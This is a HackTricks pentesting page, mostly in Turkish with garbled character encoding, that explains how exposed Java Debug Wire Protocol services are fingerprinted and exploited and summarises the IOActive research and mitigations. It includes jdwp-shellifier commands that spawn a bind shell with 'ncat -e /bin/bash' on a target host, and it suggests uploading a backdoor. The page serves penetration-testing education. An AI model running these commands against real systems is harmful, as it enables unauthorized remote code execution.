# Pentesting JDWP - Java Debug Wire Protocol

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Exploiting

JDWP istismarÄ±, **protokolÃ¼n kimlik doÄŸrulama ve ÅŸifreleme eksikliÄŸine** dayanÄ±r. Genellikle **8000 numaralÄ± portta** bulunur, ancak diÄŸer portlar da mÃ¼mkÃ¼ndÃ¼r. Ä°lk baÄŸlantÄ±, hedef porta "JDWP-Handshake" gÃ¶nderilerek yapÄ±lÄ±r. EÄŸer bir JDWP servisi aktifse, aynÄ± dize ile yanÄ±t verir ve varlÄ±ÄŸÄ±nÄ± doÄŸrular. Bu el sÄ±kÄ±ÅŸma, aÄŸdaki JDWP hizmetlerini tanÄ±mlamak iÃ§in bir parmak izi yÃ¶ntemi olarak iÅŸlev gÃ¶rÃ¼r.

SÃ¼reÃ§ tanÄ±mlamasÄ± aÃ§Ä±sÄ±ndan, Java sÃ¼reÃ§lerinde "jdwk" dizesini aramak, aktif bir JDWP oturumunu gÃ¶sterebilir.

KullanÄ±lacak araÃ§ [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier). FarklÄ± parametrelerle kullanabilirsiniz:
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
I found that the use of `--break-on 'java.lang.String.indexOf'` make the exploit more **stable**. And if you have the change to upload a backdoor to the host and execute it instead of executing a command, the exploit will be even more stable.

## Daha fazla detay

**Bu, [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/) adresinin bir Ã¶zetidir.** Daha fazla detay iÃ§in kontrol edin.

1. **JDWP Genel BakÄ±ÅŸ**:
- Paket tabanlÄ± bir aÄŸ ikili protokoldÃ¼r, Ã¶ncelikle senkronizedir.
- Kimlik doÄŸrulama ve ÅŸifreleme eksikliÄŸi, dÃ¼ÅŸmanca aÄŸlara maruz kaldÄ±ÄŸÄ±nda gÃ¼venlik aÃ§Ä±ÄŸÄ± oluÅŸturur.

2. **JDWP El SÄ±kÄ±ÅŸmasÄ±**:
- Ä°letiÅŸimi baÅŸlatmak iÃ§in basit bir el sÄ±kÄ±ÅŸma sÃ¼reci kullanÄ±lÄ±r. Debugger (istemci) ve Debuggee (sunucu) arasÄ±nda 14 karakterlik bir ASCII dizesi â€œJDWP-Handshakeâ€ deÄŸiÅŸtirilir.

3. **JDWP Ä°letiÅŸimi**:
- Mesajlar, Uzunluk, Kimlik, Bayrak ve Komut Seti gibi alanlarla basit bir yapÄ±ya sahiptir.
- Komut Seti deÄŸerleri 0x40 ile 0x80 arasÄ±nda deÄŸiÅŸir ve farklÄ± eylem ve olaylarÄ± temsil eder.

4. **SÃ¶mÃ¼rÃ¼**:
- JDWP, keyfi sÄ±nÄ±flarÄ± ve bytecode'u yÃ¼klemeye ve Ã§aÄŸÄ±rmaya izin verir, bu da gÃ¼venlik riskleri oluÅŸturur.
- Makale, Java Runtime referanslarÄ±nÄ± alma, kesme noktalarÄ± ayarlama ve yÃ¶ntemleri Ã§aÄŸÄ±rma gibi beÅŸ adÄ±mda bir sÃ¶mÃ¼rÃ¼ sÃ¼recini detaylandÄ±rmaktadÄ±r.

5. **GerÃ§ek Hayatta SÃ¶mÃ¼rÃ¼**:
- Potansiyel gÃ¼venlik duvarÄ± korumalarÄ±na raÄŸmen, JDWP hizmetleri keÅŸfedilebilir ve gerÃ§ek dÃ¼nya senaryolarÄ±nda sÃ¶mÃ¼rÃ¼lebilir, bu da ShodanHQ ve GitHub gibi platformlarda yapÄ±lan aramalarla gÃ¶sterilmektedir.
- SÃ¶mÃ¼rÃ¼ betiÄŸi Ã§eÅŸitli JDK sÃ¼rÃ¼mlerine karÅŸÄ± test edilmiÅŸtir ve platformdan baÄŸÄ±msÄ±zdÄ±r, gÃ¼venilir Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE) sunar.

6. **GÃ¼venlik Etkileri**:
- Ä°nternette aÃ§Ä±k JDWP hizmetlerinin varlÄ±ÄŸÄ±, dÃ¼zenli gÃ¼venlik incelemeleri yapma, Ã¼retimde hata ayÄ±klama iÅŸlevlerini devre dÄ±ÅŸÄ± bÄ±rakma ve uygun gÃ¼venlik duvarÄ± yapÄ±landÄ±rmalarÄ±nÄ±n gerekliliÄŸini vurgular.

### **Kaynaklar:**

* [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
* [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
* http://www.secdev.org/projects/scapy(no longer active)
* [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
* http://www.hsc-news.com/archives/2013/000109.html (no longer active)
* [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
* https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
* [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
* [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
